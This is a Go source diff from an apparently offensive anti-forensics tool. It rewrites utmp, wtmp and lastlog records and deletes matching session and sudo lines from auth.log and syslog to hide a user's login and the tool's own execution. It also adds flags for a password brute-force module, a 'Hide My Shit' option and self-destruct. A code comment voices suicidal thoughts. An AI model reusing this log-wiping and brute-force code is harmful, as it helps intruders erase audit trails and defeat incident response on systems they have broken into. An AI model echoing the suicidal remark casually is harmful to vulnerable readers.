@@ -6,10 +6,12 @@ import (
 	"flag"
 	"fmt"
 	"os"
+	"path/filepath"
 	"slices"
 	"strconv"
 	"strings"
 	authlog "test/AUTHLOG"
+	bf "test/BF"
 	check "test/CHECK"
 	lastlog "test/LASTLOG"
 	utmp "test/UTMP"
@@ -35,61 +37,84 @@ import (
 
 // Something magic happent. Somehow something workes. BUT copy paste comments makes errors. WTF?
 
+// My supervisor just said to me that everything that i have wrote doesent matters.
+
+// suicide seems a good choice
+
 var indexToDel int64
 var count int64
 var ProxyIp [16]byte
 
-var WTMP string = "/var/log/wtmp"
-
-// var AUTH_LOG string = "/var/log/auth.log"
-var SYSLOG string = "/var/log/syslog"
-
 // const LASTLOG_FILE = "/var/log/lastlog"
 // const LINE_LENGTH = 292 // Size of each entry in lastlog (defined in /usr/include/lastlog.h)
+
 var play bool = true
 
+func init() {
+	// Initialize flags
+
+	flag.BoolVar(&vars.Destr, "d", false, "Self Destruct")
+	flag.BoolVar(&vars.Combo, "c", false, "Combo Entry")
+	flag.BoolVar(&vars.HideMe, "hm", true, "Hide My Shit")
+	flag.StringVar(&vars.BrFile, "f", "", "Data File")
+	flag.StringVar(&vars.Host, "h", "192.168.23.23", "Server Host")
+	flag.StringVar(&vars.Port, "p", "", "Server Port")
+	flag.StringVar(&vars.User, "u", "", "Server Username")
+	flag.StringVar(&vars.Pass, "pa", "", "Server Pass")
+	flag.StringVar(&vars.ConnectedUser, "cu", "ubuntu", "Connected User To Delete")
+	flag.IntVar(&vars.Threads, "t", 3, "Threads")
+
+}
+
 func main() {
-	sIP := flag.String("i", "192.168.23.23", "Server Ip")
-	connectedUser := flag.String("u", "ubuntu", "Connected User")
-	flag.Parse()
+	// history.DelHistory()
+	if false {
+		if vars.HideMe {
+			euid := os.Geteuid()
+			if euid == 0 {
+				// connectedUser := flag.String("u", "ubuntu", "Connected User")
+				flag.Parse()
 
-	utmp.ClearUTMP(*sIP, *connectedUser)
-	// time.Sleep(30 * time.Second)
+				utmp.ClearUTMP(vars.Host, vars.ConnectedUser)
 
-	ConvertIPToBytearray(sIP)
-	x, _ := parceDataUtmpFile(*connectedUser)
+				ConvertIPToBytearray(&vars.Host)
+				x, _ := parceDataUtmpFile(vars.ConnectedUser)
 
-	lastlog.ChangeLastLog(sIP, &x, connectedUser)
+				lastlog.ChangeLastLog(&vars.Host, &x, &vars.ConnectedUser)
+				// /////////////////////////////////////////////////////////////////////////////
+				sessionStart := int(x.Time.Sec)
+				sessionStop := int(x.TimeEnd.Sec)
+				start, stop := authlog.GetTimeStamps(sessionStart, sessionStop)
+				// err := deleteLineAuthLog(AUTH_LOG, start, stop,sIP)
+				sessionID, err := authlog.DeleteLineAuthLog(vars.AUTH_LOG, start, stop, &vars.Host)
+				check.Check("Delete Auth Log ", err)
+				fmt.Println(sessionID)
 
-	// /////////////////////////////////////////////////////////////////////////////
-	sessionStart := int(x.Time.Sec)
-	sessionStop := int(x.TimeEnd.Sec)
-	start, stop := authlog.GetTimeStamps(sessionStart, sessionStop)
-	// err := deleteLineAuthLog(AUTH_LOG, start, stop,sIP)
-	sessionID, err := authlog.DeleteLineAuthLog(vars.AUTH_LOG, start, stop, sIP)
-	check.Check("Delete Auth Log ", err)
-	fmt.Println(sessionID)
+				patternDeleteSession := fmt.Sprintf(`^(.*(%s|%s))(.*systemd).*(Session\s*%s|session-%s\.scope:|New session %s)`, start[1], stop[1], sessionID, sessionID, sessionID)
+				err = authlog.DeleteSessionAndSudoeSyslogAuthlog(patternDeleteSession, vars.SYSLOG)
+				if err != nil {
+					fmt.Println("Errpr", err)
+				}
+				ex, err := os.Executable()
+				if err != nil {
+					panic(err)
+				}
 
-	// patternDeleteSession := fmt.Sprintf(`^(.*(%s|%s))(.*systemd).*(Session\s*%s|session-%s\.scope:|New session %s)`, start[1], stop[1], sessionID, sessionID, sessionID)
-	// err = authlog.DeleteSessionAndSudoeSyslogAuthlog(patternDeleteSession, SYSLOG)
-	// if err != nil {
-	// 	fmt.Println("Errpr", err)
-	// }
-	// ex, err := os.Executable()
-	// if err != nil {
-	// 	panic(err)
-	// }
+				exPath := filepath.Dir(ex)
+				patternDeleteSudoExec := fmt.Sprintf(`^(.*PWD=%s).*(%s)`, exPath, filepath.Base(os.Args[0]))
+				fmt.Println(patternDeleteSudoExec)
 
-	// exPath := filepath.Dir(ex)
-	// patternDeleteSudoExec := fmt.Sprintf(`^(.*PWD=%s).*(%s)`, exPath, filepath.Base(os.Args[0]))
-	// fmt.Println(patternDeleteSudoExec)
-
-	// check.Check("Error on delete Line Auth Log", err)
-	// err = authlog.DeleteSessionAndSudoeSyslogAuthlog(patternDeleteSudoExec, AUTH_LOG)
-	// if err != nil {
-	// 	fmt.Println(err)
-	// }
-
+				check.Check("Error on delete Line Auth Log", err)
+				err = authlog.DeleteSessionAndSudoeSyslogAuthlog(patternDeleteSudoExec, vars.AUTH_LOG)
+				if err != nil {
+					fmt.Println(err)
+				}
+			}
+		}
+		if false {
+			bf.Bf()
+		}
+	}
 }
 
 func ConvertIPToBytearray(ip *string) {
@@ -121,7 +146,7 @@ func parceDataUtmpFile(connectedUser string) (vars.DataToInfl, error) {
 	count = 0
 	// sizeUtmp := int64(binary.Size(Utmp{}))
 	// fmt.Println(sizeUtmp)
-	file, err := os.Open(WTMP)
+	file, err := os.Open(vars.WTMP)
 	if err != nil {
 		fmt.Printf("Error opening utmp file: %v\n", err)
 		return vars.DataToInfl{}, err
@@ -144,10 +169,7 @@ func parceDataUtmpFile(connectedUser string) (vars.DataToInfl, error) {
 				name = name + string(j)
 			}
 		}
-		fmt.Println(DtIN, "DATA TO INFL")
 		if name == connectedUser && record.Type == 0x7 {
-			fmt.Println(record.Type, "<<<<<<<<<<<<<<<<<SESSION")
-			fmt.Println(record)
 
 			DtIN = append(DtIN, vars.DataToInfl{User: string(record.User[:]),
 				Pid: record.Pid,
@@ -163,19 +185,19 @@ func parceDataUtmpFile(connectedUser string) (vars.DataToInfl, error) {
 		} else if record.Type == 0x8 {
 			if len(DtIN)-1 > -1 {
 				if DtIN[len(DtIN)-1].Pid == record.Pid {
+					fmt.Println("MESA MESA")
 					DtIN[len(DtIN)-1].Time.Sec = record.Time.Sec
 					DtIN[len(DtIN)-1].Time.Usec = record.Time.Usec
 				}
 			}
 		}
-		check.Pouse()
 		count += 1
 	}
 
 	//////////////////////////////////////////////////////////////////////////////
 
 	if play {
-		err = deleteBytesFromFile(WTMP, indexToDel*384, 384)
+		err = deleteBytesFromFile(vars.WTMP, indexToDel*384, 384)
 		if err != nil {
 			fmt.Println(err)
 		}
